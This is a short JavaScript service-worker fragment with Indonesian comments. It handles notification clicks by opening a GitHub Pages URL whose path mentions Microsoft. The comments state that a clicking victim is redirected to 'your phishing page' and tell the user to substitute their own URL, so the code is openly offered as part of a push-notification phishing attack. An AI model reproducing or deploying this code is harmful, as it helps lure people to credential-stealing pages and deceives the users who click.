self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    // Jika korban klik notifikasi, arahkan ke halaman phishing Anda
    event.waitUntil(
        clients.openWindow('https://artha231.github.io/bug-microsoft-new-test/') // Ganti dengan URL Anda
    );
});